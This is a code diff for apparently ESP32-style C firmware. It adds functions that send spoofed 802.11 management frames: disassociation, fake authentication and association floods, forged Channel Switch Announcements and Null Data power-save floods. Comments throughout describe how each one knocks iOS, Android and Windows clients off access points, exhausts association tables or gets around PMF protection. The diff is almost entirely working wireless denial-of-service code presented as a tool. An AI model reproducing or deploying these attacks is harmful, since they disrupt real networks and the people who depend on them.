@@ -23,10 +23,11 @@ void wifi_tx_raw_frame(void* frame, size_t length) {
 }
 
 /*
- * Transmits a 802.11 deauth frame on the active channel
- * @param src_mac An array of bytes containing the mac address of the sender. The array has to be 6 bytes in size
- * @param dst_mac An array of bytes containing the destination mac address or FF:FF:FF:FF:FF:FF to broadcast the deauth
- * @param reason A reason code according to the 802.11 spec. Optional 
+ * Transmits a 802.11 deauth frame (type 0xC0) on the active channel.
+ * Effective against all platforms — kicks all associated clients.
+ * @param src_mac  MAC of the AP (spoofed sender)
+ * @param dst_mac  Destination MAC, FF:FF:FF:FF:FF:FF to broadcast
+ * @param reason   802.11 reason code
 */
 void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
   DeauthFrame frame;
@@ -38,11 +39,93 @@ void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
 }
 
 /*
+ * Transmits a 802.11 disassociation frame (type 0xA0) on the active channel.
+ * More effective against iOS and Android than deauth alone — triggers a full
+ * re-association which is slower and easier to disrupt continuously.
+ * @param src_mac  MAC of the AP (spoofed sender)
+ * @param dst_mac  Destination MAC, FF:FF:FF:FF:FF:FF to broadcast
+ * @param reason   802.11 reason code
+*/
+void wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason) {
+  DisassocFrame frame;
+  memcpy(&frame.source, src_mac, 6);
+  memcpy(&frame.access_point, src_mac, 6);
+  memcpy(&frame.destination, dst_mac, 6);
+  frame.reason = reason;
+  wifi_tx_raw_frame(&frame, sizeof(DisassocFrame));
+}
+
+/*
  * Transmits a very basic 802.11 beacon with the given ssid on the active channel
  * @param src_mac An array of bytes containing the mac address of the sender. The array has to be 6 bytes in size
  * @param dst_mac An array of bytes containing the destination mac address or FF:FF:FF:FF:FF:FF to broadcast the beacon
  * @param ssid '\0' terminated array of characters representing the SSID
 */
+/*
+ * Sends a fake 802.11 Open System Authentication Request from fake_client_mac to the AP.
+ * This frame is NOT covered by PMF and runs before association.
+ * Flooding with many different fake_client_mac values exhausts the AP's association table.
+ * @param ap_mac         The BSSID of the target AP
+ * @param fake_client_mac A locally administered, unicast MAC to spoof as the client
+ */
+void wifi_tx_auth_frame(void* ap_mac, void* fake_client_mac) {
+  AuthReqFrame frame;
+  memcpy(&frame.destination,   ap_mac,          6);
+  memcpy(&frame.source,        fake_client_mac, 6);
+  memcpy(&frame.access_point,  ap_mac,          6);
+  wifi_tx_raw_frame(&frame, sizeof(AuthReqFrame));
+}
+
+/*
+ * Sends a fake 802.11 Association Request from fake_client_mac to the AP.
+ * Must follow an auth frame. Together with wifi_tx_auth_frame this
+ * fully claims an AP association table entry.
+ * @param ap_mac         The BSSID of the target AP
+ * @param fake_client_mac The same MAC used in the preceding auth frame
+ */
+void wifi_tx_assoc_frame(void* ap_mac, void* fake_client_mac) {
+  AssocReqFrame frame;
+  memcpy(&frame.destination,  ap_mac,          6);
+  memcpy(&frame.source,       fake_client_mac, 6);
+  memcpy(&frame.access_point, ap_mac,          6);
+  wifi_tx_raw_frame(&frame, sizeof(AssocReqFrame));
+}
+
+/*
+ * Sends a Channel Switch Announcement (CSA) Action frame.
+ * Instructs all listening 802.11 clients to switch to new_channel.
+ * Using an invalid or very crowded channel prevents reconnection.
+ * Windows drivers often honor CSA from unprotected sources.
+ * @param ap_mac      The BSSID to spoof as the sender
+ * @param new_channel Target channel (14 = invalid in EU/TR; disables most clients)
+ */
+void wifi_tx_csa_frame(void* ap_mac, uint8_t new_channel) {
+  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  CSAFrame frame;
+  memcpy(&frame.destination,  broadcast, 6);
+  memcpy(&frame.source,       ap_mac,    6);
+  memcpy(&frame.access_point, ap_mac,    6);
+  frame.new_channel = new_channel;
+  wifi_tx_raw_frame(&frame, sizeof(CSAFrame));
+}
+
+/*
+ * Sends a Null Data frame with Power Management bit = 1 (PM=1).
+ * The AP interprets this as: "this client is going to sleep, buffer its frames."
+ * Flooding from many unique fake MACs fills the AP's power-save buffer queue.
+ * While the buffer is full, the AP cannot efficiently serve real clients —
+ * iOS reconnects but data delivery is severely degraded (effective blackout).
+ * @param ap_mac         Target AP BSSID
+ * @param fake_client_mac Spoofed STA MAC (use nextFloodMAC for variety)
+ */
+void wifi_tx_null_frame(void* ap_mac, void* fake_client_mac) {
+  NullDataFrame frame;
+  memcpy(&frame.destination,  ap_mac,          6);
+  memcpy(&frame.source,       fake_client_mac, 6);
+  memcpy(&frame.access_point, ap_mac,          6);
+  wifi_tx_raw_frame(&frame, sizeof(NullDataFrame));
+}
+
 void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid) {
   BeaconFrame frame;
   memcpy(&frame.source, src_mac, 6);
